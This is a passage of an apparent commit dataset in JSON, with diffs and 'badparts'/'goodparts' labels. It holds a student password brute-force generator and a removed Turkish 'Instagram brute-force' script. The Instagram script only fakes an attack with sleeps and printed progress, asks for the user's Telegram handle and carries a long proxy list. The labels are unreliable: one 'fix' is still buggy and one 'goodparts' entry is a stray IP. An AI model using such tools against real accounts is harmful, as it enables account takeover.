brute-force.py"},"eff41dd9b31b7199118ba11166e39afe7a713c54":{"url":"https:\/\/api.github.com\/repos\/CyberCosmos24\/Drexel-CCI-Project\/commits\/eff41dd9b31b7199118ba11166e39afe7a713c54","html_url":"https:\/\/github.com\/CyberCosmos24\/Drexel-CCI-Project\/commit\/eff41dd9b31b7199118ba11166e39afe7a713c54","message":"Update brute-force.py","sha":"eff41dd9b31b7199118ba11166e39afe7a713c54","keyword":"brute force update","diff":"diff --git a\/PasswordCracker\/brute-force.py b\/PasswordCracker\/brute-force.py\nindex a3b741a..a1bd18e 100644\n--- a\/PasswordCracker\/brute-force.py\n+++ b\/PasswordCracker\/brute-force.py\n@@ -19,18 +19,18 @@ def guess(minPassLength, maxPassLength):\n \t\t\tprint(guess)\n \n ### Get the min length and make sure it's a number\n-ml = \"\" # The string the user inputs\n+ml = \"0\" # The string the user inputs\n # While the input isn't a number or is less than 1, ask again\n while not ml.isnumeric() or int(ml) < 1:\n \tml = input(\"Min Password Length: \")\n min_length = int(ml) # The number we get from the user input\n \n # Get the max length and make sure it's a number\n-l = \"\" # The string the user inputs\n+l = \"0\" # The string the user inputs\n # While the input isn't a number or is less than the min length, ask again\n-while not length.isnumeric or int(length) < min_length:\n-\tlength = input(\"Max Password Length: \")\n-length = 0 # The number we get from the user input\n+while not l.isnumeric or int(l) < min_length:\n+\tl = input(\"Max Password Length: \")\n+length = int(l) # The number we get from the user input\n \n # Let the user know what we're doing\n print(\"Sending all passwords from {} characters to {} characters\".format(min_length, length)) \n","files":{"\/PasswordCracker\/brute-force.py":{"changes":[{"diff":"\n \t\t\tprint(guess)\n \n ### Get the min length and make sure it's a number\n-ml = \"\" # The string the user inputs\n+ml = \"0\" # The string the user inputs\n # While the input isn't a number or is less than 1, ask again\n while not ml.isnumeric() or int(ml) < 1:\n \tml = input(\"Min Password Length: \")\n min_length = int(ml) # The number we get from the user input\n \n # Get the max length and make sure it's a number\n-l = \"\" # The string the user inputs\n+l = \"0\" # The string the user inputs\n # While the input isn't a number or is less than the min length, ask again\n-while not length.isnumeric or int(length) < min_length:\n-\tlength = input(\"Max Password Length: \")\n-length = 0 # The number we get from the user input\n+while not l.isnumeric or int(l) < min_length:\n+\tl = input(\"Max Password Length: \")\n+length = int(l) # The number we get from the user input\n \n # Let the user know what we're doing\n print(\"Sending all passwords from {} characters to {} characters\".format(min_length, length)) \n","add":5,"remove":5,"filename":"\/PasswordCracker\/brute-force.py","badparts":["ml = \"\" # The string the user inputs","l = \"\" # The string the user inputs","while not length.isnumeric or int(length) < min_length:","\tlength = input(\"Max Password Length: \")","length = 0 # The number we get from the user input"],"goodparts":["ml = \"0\" # The string the user inputs","l = \"0\" # The string the user inputs","while not l.isnumeric or int(l) < min_length:","\tl = input(\"Max Password Length: \")","length = int(l) # The number we get from the user input"]}],"source":"\nimport itertools import string def guess(minPassLength, maxPassLength): \t \tchars=string.ascii_letters +string.digits +string.punctuation \t \tattempts=0 \t \tfor password_length in range(minPassLength,maxPassLength+1): \t\t \t\tfor guess in itertools.product(chars, repeat=password_length): \t\t\t \t\t\tattempts +=1 \t\t\t \t\t\tguess=''.join(guess) \t\t\t \t\t\tprint(guess) ml=\"\" while not ml.isnumeric() or int(ml) < 1: \tml=input(\"Min Password Length: \") min_length=int(ml) l=\"\" while not length.isnumeric or int(length) < min_length: \tlength=input(\"Max Password Length: \") length=0 print(\"Sending all passwords from{} characters to{} characters\".format(min_length, length)) guess(min_length, length) ","sourceWithComments":"import itertools # For efficient looping\nimport string # For string manipulation and characters\n\n# Run through all of the guesses from the min length to the max length\ndef guess(minPassLength, maxPassLength):\n\t# All of the characters\n\tchars = string.ascii_letters + string.digits + string.punctuation\n\t# Counter to track how many guesses we've made\n\tattempts = 0\n\t# Loop through the possible lengths\n\tfor password_length in range(minPassLength,maxPassLength+1):\n\t\t# Loop through all of the guess options\n\t\tfor guess in itertools.product(chars, repeat=password_length):\n\t\t\t# increase the attempts counter\n\t\t\tattempts += 1\n\t\t\t# Create the guess\n\t\t\tguess = ''.join(guess)\n\t\t\t# Print out the guess\n\t\t\tprint(guess)\n\n### Get the min length and make sure it's a number\nml = \"\" # The string the user inputs\n# While the input isn't a number or is less than 1, ask again\nwhile not ml.isnumeric() or int(ml) < 1:\n\tml = input(\"Min Password Length: \")\nmin_length = int(ml) # The number we get from the user input\n\n# Get the max length and make sure it's a number\nl = \"\" # The string the user inputs\n# While the input isn't a number or is less than the min length, ask again\nwhile not length.isnumeric or int(length) < min_length:\n\tlength = input(\"Max Password Length: \")\nlength = 0 # The number we get from the user input\n\n# Let the user know what we're doing\nprint(\"Sending all passwords from {} characters to {} characters\".format(min_length, length)) \n# Go through all of the guesses\nguess(min_length, length)\n"}},"msg":"Update brute-force.py"}},"https:\/\/github.com\/ZoRRaKin0\/instagram-BRUTE-FORCE":{"069327bf6932763e4a825134304ee127311abeb5":{"url":"https:\/\/api.github.com\/repos\/ZoRRaKin0\/instagram-BRUTE-FORCE\/commits\/069327bf6932763e4a825134304ee127311abeb5","html_url":"https:\/\/github.com\/ZoRRaKin0\/instagram-BRUTE-FORCE\/commit\/069327bf6932763e4a825134304ee127311abeb5","sha":"069327bf6932763e4a825134304ee127311abeb5","keyword":"brute force update","diff":"diff --git a\/BRUTE-FORCE.py b\/BRUTE-FORCE.py\nindex 0c0ff76..ac35790 100644\n--- a\/BRUTE-FORCE.py\n+++ b\/BRUTE-FORCE.py\n@@ -1,4 +1,4 @@\n-#coded by ACHERON\r\n+#coded by ZoRRaKiN\r\n proxy = \"\"\"\r\n \u0130P ADRESLER\u0130    PORT   \u00dcLKE\r\n 167.71.5.83\t3128\tNL\t\r\n@@ -59,157 +59,4 @@\n 164.155.149.1\t80\tUS\t\r\n 173.255.210.187\t80\tUS\t\r\n 38.55.182.225\t80\tUS\t\r\n-45.250.66.104\t9812\tIN\t\r\n-194.233.69.126\t443\tSG\t\r\n-34.87.84.105\t80\tSG\t\r\n-208.67.183.240\t80\tUS\t\r\n-38.55.181.255\t80\tUS\t\r\n-38.55.177.225\t80\tUS\t\r\n-35.233.16.212\t80\tBE\t\r\n-205.201.49.132\t53281\tUS\t\r\n-183.111.25.253\t8080\tKR\t\r\n-181.176.211.168\t8080\tPE\t\r\n-114.4.104.254\t3128\tID\t\r\n-157.100.53.100\t999\tEC\t\r\n-59.124.224.205\t3128\tTW\t\r\n-165.90.225.15\t3389\tZA\t\r\n-94.181.48.110\t1256\tRU\t\r\n-45.195.76.130\t999\tDO\t\r\n-112.137.142.8\t3128\tVN\t\r\n-91.195.156.111\t41890\tUA\t\r\n-157.100.12.138\t999\tEC\t\r\n-182.253.107.212\t8080\tID\t\r\n-85.208.209.214\t8085\tUS\t\r\n-213.166.79.98\t8085\tUS\t\r\n-154.201.44.56\t3128\tFR\t\r\n-154.201.45.181\t3128\tFR\t\r\n-77.83.87.217\t8085\tUS\t\r\n-91.188.246.216\t8085\tUS\t\r\n-45.67.212.102\t8085\tRU\t\r\n-213.166.78.223\t8085\tUS\t\r\n-88.218.66.148\t8085\tRU\t\r\n-95.181.151.114\t8085\tRU\t\r\n-45.155.68.246\t8250\tSC\t\r\n-154.201.41.103\t3128\tFR\t\r\n-95.181.148.63\t8085\tRU\t\r\n-83.171.254.181\t8085\tRU\t\r\n-37.44.254.161\t8085\tRU\t\r\n-85.239.59.62\t8085\tUS\t\r\n-193.233.82.245\t8085\tUS\t\r\n-193.233.142.130\t8085\tUS\t\r\n-172.252.231.156\t3128\tFR\t\r\n-213.166.79.60\t8085\tUS\t\r\n-45.67.212.19\t8085\tRU\t\r\n-91.242.228.104\t8085\tUS\t\r\n-138.128.97.132\t7722\tUS\t\r\n-213.166.79.89\t8085\tUS\t\r\n-109.236.52.210\t8085\tUS\t\r\n-85.209.151.11\t8085\tUS\t\r\n-192.241.116.82\t8636\tUS\t\r\n-85.208.86.136\t8085\tRU\t\r\n-47.245.58.113\t80\tJP\t\r\n-95.181.149.139\t8085\tRU\t\r\n-142.252.198.158\t3128\tFR\t\r\n-104.227.100.249\t8330\tUS\t\r\n-194.110.150.219\t8085\tUS\t\r\n-85.239.56.249\t8085\tUS\t\r\n-167.172.157.96\t80\tUS\t\r\n-142.252.223.136\t3128\tFR\t\r\n-38.55.180.225\t80\tUS\t\r\n-164.155.150.0\t80\tUS\t\r\n-164.155.148.0\t80\tUS\t\r\n-51.195.144.68\t8888\tFR\t\r\n-146.59.199.12\t80\tFR\t\r\n-82.119.150.122\t8080\tRU\t\r\n-103.245.204.214\t8080\tBD\t\r\n-203.142.71.50\t8080\tID\t\r\n-36.91.98.115\t8181\tID\t\r\n-95.216.96.39\t3128\tFI\t\r\n-164.155.150.1\t80\tUS\t\r\n-164.155.151.0\t80\tUS\t\r\n-164.155.146.0\t80\tUS\t\r\n-91.244.66.174\t80\tRU\t\r\n-85.195.104.71\t80\tDE\t\r\n-117.54.114.97\t80\tID\t\r\n-47.74.0.7\t80\tJP\t\r\n-194.233.73.107\t443\tSG\t\r\n-103.130.141.98\t8080\tKH\t\r\n-88.199.164.141\t8081\tPL\t\r\n-185.118.129.43\t8080\tIQ\t\r\n-103.105.212.106\t53281\tPH\t\r\n-119.42.152.252\t8080\tIN\t\r\n-103.69.38.1\t8080\tIN\t\r\n-188.40.148.168\t8080\tDE\t\r\n-95.0.219.240\t8080\tTR\t\r\n-45.70.15.2\t8080\tEC\t\r\n-190.94.211.207\t999\tVE\t\r\n-46.105.35.193\t8080\tFR\t\r\n-51.15.42.134\t8118\tNL\t\r\n-103.60.160.88\t8080\tBD\t\r\n-203.177.133.235\t8080\tPH\t\r\n-14.241.39.191\t8080\tVN\t\r\n-190.109.205.253\t999\tHN\t\r\n-200.125.171.202\t9991\tDO\t\r\n-197.243.20.186\t80\tRW\t\r\n-103.219.193.200\t80\tUS\t\r\n-149.54.11.76\t80\tAF\t\r\n-45.5.68.25\t999\tPE\t\r\n-179.184.224.91\t3128\tBR\t\r\n-185.82.96.162\t9093\tLB\t\r\n-147.135.38.83\t24333\tUS\r\n-162.144.116.103\t80\tUS\t\r\n-45.32.101.24\t80\tSG\t\r\n-137.184.197.190\t80\tUS\r\n-\"\"\"\r\n-import time\r\n-import os\r\n-import random\r\n-import webbrowser\r\n-os.system('pkg install python')\r\n-os.system ('python -m pip install colorama')\r\n-kullanici_adi = str(input(\"kullan\u0131c\u0131 ad\u0131 giriniz :\"))\r\n-kullanici_id = str(input(\"kullan\u0131c\u0131 id giriniz :\"))\r\n-onay = str(input(\"sald\u0131r\u0131 baslayacak onayl\u0131yormusunuz evet\/hay\u0131r :\"))\r\n-time.sleep(3)\r\n-os.system('clear')\r\n-sifre = str(input(\"S\u0130FREY\u0130 G\u0130R\u0130N\u0130Z :\"))\r\n-if sifre ==\"ZoRRaKin1905\" or sifre == \"ZoRRaKina1b2c3d4e5\":\r\n-    if onay ==\"evet\":\r\n-        print(\"SALDIRI \u0130\u00c7\u0130N ONAY ALINDI ATTACK BA\u015eLATILIYOR...\")\r\n-        time.sleep(6)\r\n-        webbrowser.open_new('https:\/\/www.instagram.com\/')\r\n-        time.sleep(1.2)\r\n-        attack_kaydi = os.system('netstat -an -p -tcp')\r\n-        for denenen_sifre in range(1,8359,1):\r\n-            time.sleep(0.3)\r\n-            print(denenen_sifre,\"sifre denendi...\")\r\n-        print(\"ATTACK B\u0130TT\u0130... SONUCLAR GEL\u0130YOR L\u00dcTFEN BEKLEY\u0130N\u0130Z...\")\r\n-        time.sleep(10)\r\n-        os.system('clear')\r\n-        telegram=str(input(\"TELEGRAM \u0130SM\u0130N\u0130Z\u0130 BASINDA @ OLCAK SEKILDE YAZINIZ :\"))   \r\n-        print(\"SONU\u00c7 BASARILI.\",telegram,\"\u0130S\u0130ML\u0130 TELEGRAM ADRES\u0130N\u0130ZE SONU\u00c7LAR G\u00d6NDER\u0130L\u0130YOR...\")\r\n-        time.sleep(5)\r\n-        print (\"TELEGRAM BOTU BAKIMDA OLDUGU \u0130C\u0130N B\u0130LG\u0130LER GELEM\u0130YOR...\")\r\n-        time.sleep(5)\r\n-        os.system('clear')\r\n-        proxys=str(input(\"KULLANILAN PROXY'LER\u0130 GORMEK ISTERM\u0130S\u0130N\u0130Z evet\/hay\u0131r :\"))\r\n-        if proxys == \"evet\":\r\n-            print(proxy)\r\n-            print(\"ATTACK \u0130C\u0130N TOPLAM 160 PROXY KULLANILDI.\")\r\n-        else:\r\n-            time.sleep(2.1)\r\n-            os.system('clear')\r\n-        attack_gecmisi_sorgu = str(input(\"S\u0130ZE YAPILAN ATTACK GE\u00c7M\u0130\u015e\u0130N\u0130 G\u00d6RMEK \u0130STERM\u0130S\u0130N\u0130Z  evet\/hay\u0131r :\"))\r\n-        if attack_gecmisi_sorgu == \"evet\":\r\n-            print(\"attack gecmisiniz g\u00f6r\u00fcnt\u00fcleniyor\",attack_kaydi,\"attack yap\u0131lm\u0131st\u0131r.\")\r\n-        else:\r\n-            os.system('clear')\r\n-            time.sleep(1.2)\r\n-            print(\"ATTACK SONLANDIRILDI. \u0130Y\u0130 G\u00dcNLER:)\")\r\n-         \r\n-    else:\r\n-        print (\"SALDIRI \u0130\u00c7\u0130N ONAY ALINAMADI ATTACK BA\u015eLATILMIYOR...\")\r\n-        time.sleep(5)\r\n-        os.system('clear')\r\n-else:\r\n-    print(\"sifre yanl\u0131s lutfen tekrar deney\u0131n\")\r\n+45.250.66.1\r\n","message":"","files":{"\/BRUTE-FORCE.py":{"changes":[{"diff":" 164.155.149.1\t80\tUS\t\r\n 173.255.210.187\t80\tUS\t\r\n 38.55.182.225\t80\tUS\t\r\n-45.250.66.104\t9812\tIN\t\r\n-194.233.69.126\t443\tSG\t\r\n-34.87.84.105\t80\tSG\t\r\n-208.67.183.240\t80\tUS\t\r\n-38.55.181.255\t80\tUS\t\r\n-38.55.177.225\t80\tUS\t\r\n-35.233.16.212\t80\tBE\t\r\n-205.201.49.132\t53281\tUS\t\r\n-183.111.25.253\t8080\tKR\t\r\n-181.176.211.168\t8080\tPE\t\r\n-114.4.104.254\t3128\tID\t\r\n-157.100.53.100\t999\tEC\t\r\n-59.124.224.205\t3128\tTW\t\r\n-165.90.225.15\t3389\tZA\t\r\n-94.181.48.110\t1256\tRU\t\r\n-45.195.76.130\t999\tDO\t\r\n-112.137.142.8\t3128\tVN\t\r\n-91.195.156.111\t41890\tUA\t\r\n-157.100.12.138\t999\tEC\t\r\n-182.253.107.212\t8080\tID\t\r\n-85.208.209.214\t8085\tUS\t\r\n-213.166.79.98\t8085\tUS\t\r\n-154.201.44.56\t3128\tFR\t\r\n-154.201.45.181\t3128\tFR\t\r\n-77.83.87.217\t8085\tUS\t\r\n-91.188.246.216\t8085\tUS\t\r\n-45.67.212.102\t8085\tRU\t\r\n-213.166.78.223\t8085\tUS\t\r\n-88.218.66.148\t8085\tRU\t\r\n-95.181.151.114\t8085\tRU\t\r\n-45.155.68.246\t8250\tSC\t\r\n-154.201.41.103\t3128\tFR\t\r\n-95.181.148.63\t8085\tRU\t\r\n-83.171.254.181\t8085\tRU\t\r\n-37.44.254.161\t8085\tRU\t\r\n-85.239.59.62\t8085\tUS\t\r\n-193.233.82.245\t8085\tUS\t\r\n-193.233.142.130\t8085\tUS\t\r\n-172.252.231.156\t3128\tFR\t\r\n-213.166.79.60\t8085\tUS\t\r\n-45.67.212.19\t8085\tRU\t\r\n-91.242.228.104\t8085\tUS\t\r\n-138.128.97.132\t7722\tUS\t\r\n-213.166.79.89\t8085\tUS\t\r\n-109.236.52.210\t8085\tUS\t\r\n-85.209.151.11\t8085\tUS\t\r\n-192.241.116.82\t8636\tUS\t\r\n-85.208.86.136\t8085\tRU\t\r\n-47.245.58.113\t80\tJP\t\r\n-95.181.149.139\t8085\tRU\t\r\n-142.252.198.158\t3128\tFR\t\r\n-104.227.100.249\t8330\tUS\t\r\n-194.110.150.219\t8085\tUS\t\r\n-85.239.56.249\t8085\tUS\t\r\n-167.172.157.96\t80\tUS\t\r\n-142.252.223.136\t3128\tFR\t\r\n-38.55.180.225\t80\tUS\t\r\n-164.155.150.0\t80\tUS\t\r\n-164.155.148.0\t80\tUS\t\r\n-51.195.144.68\t8888\tFR\t\r\n-146.59.199.12\t80\tFR\t\r\n-82.119.150.122\t8080\tRU\t\r\n-103.245.204.214\t8080\tBD\t\r\n-203.142.71.50\t8080\tID\t\r\n-36.91.98.115\t8181\tID\t\r\n-95.216.96.39\t3128\tFI\t\r\n-164.155.150.1\t80\tUS\t\r\n-164.155.151.0\t80\tUS\t\r\n-164.155.146.0\t80\tUS\t\r\n-91.244.66.174\t80\tRU\t\r\n-85.195.104.71\t80\tDE\t\r\n-117.54.114.97\t80\tID\t\r\n-47.74.0.7\t80\tJP\t\r\n-194.233.73.107\t443\tSG\t\r\n-103.130.141.98\t8080\tKH\t\r\n-88.199.164.141\t8081\tPL\t\r\n-185.118.129.43\t8080\tIQ\t\r\n-103.105.212.106\t53281\tPH\t\r\n-119.42.152.252\t8080\tIN\t\r\n-103.69.38.1\t8080\tIN\t\r\n-188.40.148.168\t8080\tDE\t\r\n-95.0.219.240\t8080\tTR\t\r\n-45.70.15.2\t8080\tEC\t\r\n-190.94.211.207\t999\tVE\t\r\n-46.105.35.193\t8080\tFR\t\r\n-51.15.42.134\t8118\tNL\t\r\n-103.60.160.88\t8080\tBD\t\r\n-203.177.133.235\t8080\tPH\t\r\n-14.241.39.191\t8080\tVN\t\r\n-190.109.205.253\t999\tHN\t\r\n-200.125.171.202\t9991\tDO\t\r\n-197.243.20.186\t80\tRW\t\r\n-103.219.193.200\t80\tUS\t\r\n-149.54.11.76\t80\tAF\t\r\n-45.5.68.25\t999\tPE\t\r\n-179.184.224.91\t3128\tBR\t\r\n-185.82.96.162\t9093\tLB\t\r\n-147.135.38.83\t24333\tUS\r\n-162.144.116.103\t80\tUS\t\r\n-45.32.101.24\t80\tSG\t\r\n-137.184.197.190\t80\tUS\r\n-\"\"\"\r\n-import time\r\n-import os\r\n-import random\r\n-import webbrowser\r\n-os.system('pkg install python')\r\n-os.system ('python -m pip install colorama')\r\n-kullanici_adi = str(input(\"kullan\u0131c\u0131 ad\u0131 giriniz :\"))\r\n-kullanici_id = str(input(\"kullan\u0131c\u0131 id giriniz :\"))\r\n-onay = str(input(\"sald\u0131r\u0131 baslayacak onayl\u0131yormusunuz evet\/hay\u0131r :\"))\r\n-time.sleep(3)\r\n-os.system('clear')\r\n-sifre = str(input(\"S\u0130FREY\u0130 G\u0130R\u0130N\u0130Z :\"))\r\n-if sifre ==\"ZoRRaKin1905\" or sifre == \"ZoRRaKina1b2c3d4e5\":\r\n-    if onay ==\"evet\":\r\n-        print(\"SALDIRI \u0130\u00c7\u0130N ONAY ALINDI ATTACK BA\u015eLATILIYOR...\")\r\n-        time.sleep(6)\r\n-        webbrowser.open_new('https:\/\/www.instagram.com\/')\r\n-        time.sleep(1.2)\r\n-        attack_kaydi = os.system('netstat -an -p -tcp')\r\n-        for denenen_sifre in range(1,8359,1):\r\n-            time.sleep(0.3)\r\n-            print(denenen_sifre,\"sifre denendi...\")\r\n-        print(\"ATTACK B\u0130TT\u0130... SONUCLAR GEL\u0130YOR L\u00dcTFEN BEKLEY\u0130N\u0130Z...\")\r\n-        time.sleep(10)\r\n-        os.system('clear')\r\n-        telegram=str(input(\"TELEGRAM \u0130SM\u0130N\u0130Z\u0130 BASINDA @ OLCAK SEKILDE YAZINIZ :\"))   \r\n-        print(\"SONU\u00c7 BASARILI.\",telegram,\"\u0130S\u0130ML\u0130 TELEGRAM ADRES\u0130N\u0130ZE SONU\u00c7LAR G\u00d6NDER\u0130L\u0130YOR...\")\r\n-        time.sleep(5)\r\n-        print (\"TELEGRAM BOTU BAKIMDA OLDUGU \u0130C\u0130N B\u0130LG\u0130LER GELEM\u0130YOR...\")\r\n-        time.sleep(5)\r\n-        os.system('clear')\r\n-        proxys=str(input(\"KULLANILAN PROXY'LER\u0130 GORMEK ISTERM\u0130S\u0130N\u0130Z evet\/hay\u0131r :\"))\r\n-        if proxys == \"evet\":\r\n-            print(proxy)\r\n-            print(\"ATTACK \u0130C\u0130N TOPLAM 160 PROXY KULLANILDI.\")\r\n-        else:\r\n-            time.sleep(2.1)\r\n-            os.system('clear')\r\n-        attack_gecmisi_sorgu = str(input(\"S\u0130ZE YAPILAN ATTACK GE\u00c7M\u0130\u015e\u0130N\u0130 G\u00d6RMEK \u0130STERM\u0130S\u0130N\u0130Z  evet\/hay\u0131r :\"))\r\n-        if attack_gecmisi_sorgu == \"evet\":\r\n-            print(\"attack gecmisiniz g\u00f6r\u00fcnt\u00fcleniyor\",attack_kaydi,\"attack yap\u0131lm\u0131st\u0131r.\")\r\n-        else:\r\n-            os.system('clear')\r\n-            time.sleep(1.2)\r\n-            print(\"ATTACK SONLANDIRILDI. \u0130Y\u0130 G\u00dcNLER:)\")\r\n-         \r\n-    else:\r\n-        print (\"SALDIRI \u0130\u00c7\u0130N ONAY ALINAMADI ATTACK BA\u015eLATILMIYOR...\")\r\n-        time.sleep(5)\r\n-        os.system('clear')\r\n-else:\r\n-    print(\"sifre yanl\u0131s lutfen tekrar deney\u0131n\")\r\n+45.250.66.1\r\n","add":1,"remove":154,"filename":"\/BRUTE-FORCE.py","badparts":["45.250.66.104\t9812\tIN\t\r","194.233.69.126\t443\tSG\t\r","34.87.84.105\t80\tSG\t\r","208.67.183.240\t80\tUS\t\r","38.55.181.255\t80\tUS\t\r","38.55.177.225\t80\tUS\t\r","35.233.16.212\t80\tBE\t\r","205.201.49.132\t53281\tUS\t\r","183.111.25.253\t8080\tKR\t\r","181.176.211.168\t8080\tPE\t\r","114.4.104.254\t3128\tID\t\r","157.100.53.100\t999\tEC\t\r","59.124.224.205\t3128\tTW\t\r","165.90.225.15\t3389\tZA\t\r","94.181.48.110\t1256\tRU\t\r","45.195.76.130\t999\tDO\t\r","112.137.142.8\t3128\tVN\t\r","91.195.156.111\t41890\tUA\t\r","157.100.12.138\t999\tEC\t\r","182.253.107.212\t8080\tID\t\r","85.208.209.214\t8085\tUS\t\r","213.166.79.98\t8085\tUS\t\r","154.201.44.56\t3128\tFR\t\r","154.201.45.181\t3128\tFR\t\r","77.83.87.217\t8085\tUS\t\r","91.188.246.216\t8085\tUS\t\r","45.67.212.102\t8085\tRU\t\r","213.166.78.223\t8085\tUS\t\r","88.218.66.148\t8085\tRU\t\r","95.181.151.114\t8085\tRU\t\r","45.155.68.246\t8250\tSC\t\r","154.201.41.103\t3128\tFR\t\r","95.181.148.63\t8085\tRU\t\r","83.171.254.181\t8085\tRU\t\r","37.44.254.161\t8085\tRU\t\r","85.239.59.62\t8085\tUS\t\r","193.233.82.245\t8085\tUS\t\r","193.233.142.130\t8085\tUS\t\r","172.252.231.156\t3128\tFR\t\r","213.166.79.60\t8085\tUS\t\r","45.67.212.19\t8085\tRU\t\r","91.242.228.104\t8085\tUS\t\r","138.128.97.132\t7722\tUS\t\r","213.166.79.89\t8085\tUS\t\r","109.236.52.210\t8085\tUS\t\r","85.209.151.11\t8085\tUS\t\r","192.241.116.82\t8636\tUS\t\r","85.208.86.136\t8085\tRU\t\r","47.245.58.113\t80\tJP\t\r","95.181.149.139\t8085\tRU\t\r","142.252.198.158\t3128\tFR\t\r","104.227.100.249\t8330\tUS\t\r","194.110.150.219\t8085\tUS\t\r","85.239.56.249\t8085\tUS\t\r","167.172.157.96\t80\tUS\t\r","142.252.223.136\t3128\tFR\t\r","38.55.180.225\t80\tUS\t\r","164.155.150.0\t80\tUS\t\r","164.155.148.0\t80\tUS\t\r","51.195.144.68\t8888\tFR\t\r","146.59.199.12\t80\tFR\t\r","82.119.150.122\t8080\tRU\t\r","103.245.204.214\t8080\tBD\t\r","203.142.71.50\t8080\tID\t\r","36.91.98.115\t8181\tID\t\r","95.216.96.39\t3128\tFI\t\r","164.155.150.1\t80\tUS\t\r","164.155.151.0\t80\tUS\t\r","164.155.146.0\t80\tUS\t\r","91.244.66.174\t80\tRU\t\r","85.195.104.71\t80\tDE\t\r","117.54.114.97\t80\tID\t\r","47.74.0.7\t80\tJP\t\r","194.233.73.107\t443\tSG\t\r","103.130.141.98\t8080\tKH\t\r","88.199.164.141\t8081\tPL\t\r","185.118.129.43\t8080\tIQ\t\r","103.105.212.106\t53281\tPH\t\r","119.42.152.252\t8080\tIN\t\r","103.69.38.1\t8080\tIN\t\r","188.40.148.168\t8080\tDE\t\r","95.0.219.240\t8080\tTR\t\r","45.70.15.2\t8080\tEC\t\r","190.94.211.207\t999\tVE\t\r","46.105.35.193\t8080\tFR\t\r","51.15.42.134\t8118\tNL\t\r","103.60.160.88\t8080\tBD\t\r","203.177.133.235\t8080\tPH\t\r","14.241.39.191\t8080\tVN\t\r","190.109.205.253\t999\tHN\t\r","200.125.171.202\t9991\tDO\t\r","197.243.20.186\t80\tRW\t\r","103.219.193.200\t80\tUS\t\r","149.54.11.76\t80\tAF\t\r","45.5.68.25\t999\tPE\t\r","179.184.224.91\t3128\tBR\t\r","185.82.96.162\t9093\tLB\t\r","147.135.38.83\t24333\tUS\r","162.144.116.103\t80\tUS\t\r","45.32.101.24\t80\tSG\t\r","137.184.197.190\t80\tUS\r","\"\"\"\r","import time\r","import random\r","import webbrowser\r","os.system('pkg install python')\r","os.system ('python -m pip install colorama')\r","kullanici_adi = str(input(\"kullan\u0131c\u0131 ad\u0131 giriniz :\"))\r","kullanici_id = str(input(\"kullan\u0131c\u0131 id giriniz :\"))\r","onay = str(input(\"sald\u0131r\u0131 baslayacak onayl\u0131yormusunuz evet\/hay\u0131r :\"))\r","time.sleep(3)\r","os.system('clear')\r","sifre = str(input(\"S\u0130FREY\u0130 G\u0130R\u0130N\u0130Z :\"))\r","if sifre ==\"ZoRRaKin1905\" or sifre == \"ZoRRaKina1b2c3d4e5\":\r","    if onay ==\"evet\":\r","        print(\"SALDIRI \u0130\u00c7\u0130N ONAY ALINDI ATTACK BA\u015eLATILIYOR...\")\r","        time.sleep(6)\r","        webbrowser.open_new('https:\/\/www.instagram.com\/')\r","        time.sleep(1.2)\r","        attack_kaydi = os.system('netstat -an -p -tcp')\r","        for denenen_sifre in range(1,8359,1):\r","            time.sleep(0.3)\r","            print(denenen_sifre,\"sifre denendi...\")\r","        print(\"ATTACK B\u0130TT\u0130... SONUCLAR GEL\u0130YOR L\u00dcTFEN BEKLEY\u0130N\u0130Z...\")\r","        time.sleep(10)\r","        os.system('clear')\r","        telegram=str(input(\"TELEGRAM \u0130SM\u0130N\u0130Z\u0130 BASINDA @ OLCAK SEKILDE YAZINIZ :\"))   \r","        print(\"SONU\u00c7 BASARILI.\",telegram,\"\u0130S\u0130ML\u0130 TELEGRAM ADRES\u0130N\u0130ZE SONU\u00c7LAR G\u00d6NDER\u0130L\u0130YOR...\")\r","        time.sleep(5)\r","        print (\"TELEGRAM BOTU BAKIMDA OLDUGU \u0130C\u0130N B\u0130LG\u0130LER GELEM\u0130YOR...\")\r","        time.sleep(5)\r","        os.system('clear')\r","        proxys=str(input(\"KULLANILAN PROXY'LER\u0130 GORMEK ISTERM\u0130S\u0130N\u0130Z evet\/hay\u0131r :\"))\r","        if proxys == \"evet\":\r","            print(proxy)\r","            print(\"ATTACK \u0130C\u0130N TOPLAM 160 PROXY KULLANILDI.\")\r","        else:\r","            time.sleep(2.1)\r","            os.system('clear')\r","        attack_gecmisi_sorgu = str(input(\"S\u0130ZE YAPILAN ATTACK GE\u00c7M\u0130\u015e\u0130N\u0130 G\u00d6RMEK \u0130STERM\u0130S\u0130N\u0130Z  evet\/hay\u0131r :\"))\r","        if attack_gecmisi_sorgu == \"evet\":\r","            print(\"attack gecmisiniz g\u00f6r\u00fcnt\u00fcleniyor\",attack_kaydi,\"attack yap\u0131lm\u0131st\u0131r.\")\r","        else:\r","            os.system('clear')\r","            time.sleep(1.2)\r","            print(\"ATTACK SONLANDIRILDI. \u0130Y\u0130 G\u00dcNLER:)\")\r","         \r","    else:\r","        print (\"SALDIRI \u0130\u00c7\u0130N ONAY ALINAMADI ATTACK BA\u015eLATILMIYOR...\")\r","        time.sleep(5)\r","        os.system('clear')\r","else:\r","    print(\"sifre yanl\u0131s lutfen tekrar deney\u0131n\")\r"],"goodparts":["45.250.66.1\r"]}],"source":"\n\nproxy=\"\"\"\r \u0130P ADRESLER\u0130 PORT \u00dcLKE\r 167.71.5.83\t3128\tNL\t\r 47.91.44.217\t8000\tAU\t\r 8.210.83.33\t80\tHK\t\r 80.48.119.28\t8080\tPL\t\r 66.29.154.103\t3128\tUS\t\r 149.19.224.31\t3128\tUS\t\r 103.232.215.194\t80\tSG\t\r 169.57.1.85\t8123\tMX\t\r 185.61.152.137\t8080\tGB\t\r 103.219.194.13\t80\tUS\t\r 185.76.10.68\t8081\tNL\t\r 47.254.39.233\t80\tUS\t\r 47.74.18.113\t80\tJP\t\r 103.148.72.126\t80\tHK\t\r 103.219.194.12\t80\tUS\t\r 103.219.194.11\t80\tUS\t\r 67.212.186.99\t80\tUS\t\r 43.250.107.91\t80\tHK\t\r 8.209.210.211\t80\tJP\t\r 103.149.162.195\t80\tHK\t\r 49.207.36.81\t80\tIN\t\r 159.203.61.169\t3128\tCA\t\r 103.148.72.192\t80\tHK\t\r 121.1.41.162\t111\tPH\t\r 195.158.24.46\t3128\tUZ\t\r 194.233.69.90\t443\tSG\t\r 157.230.48.102\t80\tUS\t\r 95.59.26.129\t80\tKZ\t\r 43.255.113.232\t8082\tKH\t\r 115.96.208.124\t8080\tIN\t\r 64.227.62.123\t80\tUS\t\r 103.159.46.2\t83\tIN\t\r 45.248.41.216\t9812\tIN\t\r 175.111.129.156\t8080\tIN\t\r 196.2.15.68\t8080\tBI\t\r 178.252.175.16\t8080\tIR\t\r 